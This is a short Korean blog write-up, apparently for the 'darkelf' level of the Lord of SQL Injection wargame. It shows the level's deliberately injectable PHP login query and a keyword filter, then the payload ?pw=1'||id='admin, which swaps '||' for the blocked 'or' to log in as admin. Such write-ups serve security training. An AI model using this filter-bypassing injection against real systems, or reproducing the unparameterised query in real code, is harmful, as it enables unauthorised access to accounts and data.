---
layout: post
title: ! "[LOS] darkelf"
categories: [LOS]
excerpt: " "
comments: true
share: true
tags:
  - LOS
  - Web-hacking
  - darkelf
  - write-up
---

![](/assets/posts/los/darkelf.png)

`query : select id from prob_darkelf where id='guest' and pw=''`

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect();  
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("darkelf"); 
  highlight_file(__FILE__); 
?>
```

darkelf 문제는 지금까지의 문제를 잘 풀어냈다면 한 번에 풀 수 있다.
지금까지는 ?pw=1' or id='admin 이런 식으로 풀어지만 이 문제에서는 or와 and가 필터링 되어있다.
그렇다면 or와 and를 대신 할 무언가가 있어야 한다.

or = ||
and = && 으로 대체해주자.

`?pw=1'||id='admin`

![](/assets/posts/los/darkelf_clear.png)

